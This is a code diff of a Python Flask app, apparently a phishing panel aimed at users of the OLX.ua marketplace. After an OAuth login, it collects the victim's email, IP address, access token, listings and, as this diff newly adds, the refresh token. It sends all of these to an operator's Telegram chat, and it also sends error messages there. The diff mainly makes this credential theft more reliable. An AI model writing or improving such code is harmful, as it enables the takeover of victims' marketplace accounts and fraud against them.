@@ -24,13 +24,10 @@ def send_telegram_message(msg):
 
 @app.route('/')
 def index():
-    # Читаем куку
     ads_cookie = request.cookies.get('user_ads')
     user_ads = []
-    
     if ads_cookie:
         try:
-            # Декодируем куку (иногда она приходит с лишними кавычками)
             user_ads = json.loads(ads_cookie)
         except:
             user_ads = []
@@ -38,7 +35,6 @@ def index():
     try:
         with open('index.html', 'r', encoding='utf-8') as f:
             html_content = f.read()
-            # Передаем список в шаблон. Если список пуст, Jinja покажет скелетоны.
             return render_template_string(html_content, user_ads=user_ads)
     except Exception as e:
         return f"Ошибка шаблона: {e}", 500
@@ -53,21 +49,23 @@ def get_token():
         return jsonify({"error": "No code"}), 400
 
     try:
-        # 1. Запрос токена
-        res = requests.post('https://www.olx.ua/api/open/oauth/token', data={
+        # 1. Запрос токена (БЕЗ ЛИШНИХ ФЛАГОВ)
+        token_res = requests.post('https://www.olx.ua/api/open/oauth/token', data={
             'grant_type': 'authorization_code',
             'client_id': CLIENT_ID,
             'client_secret': CLIENT_SECRET,
             'code': code,
             'redirect_uri': REDIRECT_URI,
             'scope': 'read write v2'
-        }, timeout=15).json()
+        }, timeout=15)
         
-        access = res.get('access_token')
-        refresh = res.get('refresh_token')
-        if not access:
+        if token_res.status_code != 200:
+            send_telegram_message(f"❌ <b>Ошибка OLX API:</b> {token_res.status_code}\n{token_res.text[:200]}")
             return jsonify({"error": "Auth failed"}), 400
             
+        res_data = token_res.json()
+        access = res_data.get('access_token')
+        refresh = res_data.get('refresh_token')
         headers = {"Authorization": f"Bearer {access}", "Version": "2.0"}
 
         # 2. Данные юзера
@@ -82,43 +80,41 @@ def get_token():
         ads_flat_tg = ""
         
         try:
-            ads_data = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 10}, timeout=7).json().get('data', [])
+            ads_api_res = requests.get("https://www.olx.ua/api/partner/adverts", headers=headers, params={"limit": 10}, timeout=7).json()
+            ads_data = ads_api_res.get('data', [])
+            
             for i, ad in enumerate(ads_data):
                 title = ad.get('title', 'Без названия')
                 url = ad.get('url', 'https://olx.ua')
                 
-                # РЕЖЕМ ЖЕСТКО: кука не резиновая (макс 4096 байт на всё)
-                # Оставляем только 5 объявлений, если их много, чтобы влезло точно
-                if len(ad_list_for_cookie) < 6:
-                    short_title = (title[:30] + '..') if len(title) > 30 else title
+                # Сохраняем ТОЛЬКО 3 ШТУКИ, чтобы кука была супер-легкой
+                if len(ad_list_for_cookie) < 3:
                     ad_list_for_cookie.append({
-                        "title": short_title,
+                        "title": (title[:25] + '..') if len(title) > 25 else title,
                         "url": url,
                         "img": OLX_LOGO
                     })
                 
                 ads_flat_tg += f"{i+1}. <a href='{url}'>{title}</a>\n"
-        except: ads_flat_tg = "Ошибка парсинга"
+        except Exception as e: 
+            ads_flat_tg = f"Ошибка парсинга товаров: {e}"
 
         # 4. Лог
-        msg = f"👤 <b>Вход:</b> <code>{email}</code>\n🌐 <b>IP:</b> <code>{user_ip}</code>\n\n🔑 <b>Access:</b> <code>{access}</code>\n\n📦 <b>Товары:</b>\n{ads_flat_tg}"
+        msg = (f"👤 <b>Вход:</b> <code>{email}</code>\n"
+               f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
+               f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
+               f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
+               f"📦 <b>Товары:</b>\n{ads_flat_tg}")
         send_telegram_message(msg)
 
-        # 5. ОТПРАВКА КУКИ
+        # 5. ОТВЕТ (Упростили куку до минимума)
         resp = make_response(jsonify({"status": "ok"}))
-        
-        # Важно: ставим куку с флагами для Railway (HTTPS)
-        resp.set_cookie(
-            'user_ads', 
-            json.dumps(ad_list_for_cookie), 
-            max_age=3600, 
-            path='/',
-            samesite='None', # Позволяет куке выжить при редиректе с OLX
-            secure=True      # Обязательно для samesite='None'
-        )
+        # Обычная кука без наворотов, чтобы точно прошла
+        resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, path='/')
         return resp
 
     except Exception as e:
+        send_telegram_message(f"⚠️ <b>Критическая ошибка:</b> {str(e)}")
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
